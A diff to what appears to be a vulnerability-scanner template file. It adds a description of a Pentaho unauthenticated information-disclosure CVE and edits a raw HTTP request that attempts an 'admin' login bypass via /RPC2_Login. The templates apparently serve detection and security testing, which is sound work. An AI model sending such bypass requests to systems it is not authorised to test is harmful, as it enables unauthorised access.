@@ -35297,6 +35297,7 @@
       "id": "CVE-2021-31602",
       "info": {
         "author": "pussycat0x",
+        "description": "An issue was discovered in Hitachi Vantara Pentaho through 9.1 and Pentaho Business Intelligence Server through 7.x. The Security Model has different layers of Access Control. One of these layers is the applicationContext security, which is defined in the applicationContext-spring-security.xml file. The default configuration allows an unauthenticated user with no previous knowledge of the platform settings to extract pieces of information without possessing valid credentials.\n\n",
         "metadata": {
           "shodan-query": "Pentaho"
         },
@@ -35787,7 +35788,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /RPC2_Login HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q=0.01\nConnection: close\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nOrigin: http://{{Hostname}}/\nReferer: http://{{Hostname}}/\n\n{\"id\": 1, \"method\": \"global.login\", \"params\": {\"authorityType\": \"Default\", \"clientType\": \"NetKeyboard\", \"loginType\": \"Direct\", \"password\": \"Not Used\", \"passwordType\": \"Default\", \"userName\": \"admin\"}, \"session\": 0}\n"
+            "POST /RPC2_Login HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q=0.01\nConnection: close\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\n\n{\"id\": 1, \"method\": \"global.login\", \"params\": {\"authorityType\": \"Default\", \"clientType\": \"NetKeyboard\", \"loginType\": \"Direct\", \"password\": \"Not Used\", \"passwordType\": \"Default\", \"userName\": \"admin\"}, \"session\": 0}\n"
           ]
         }
       ]
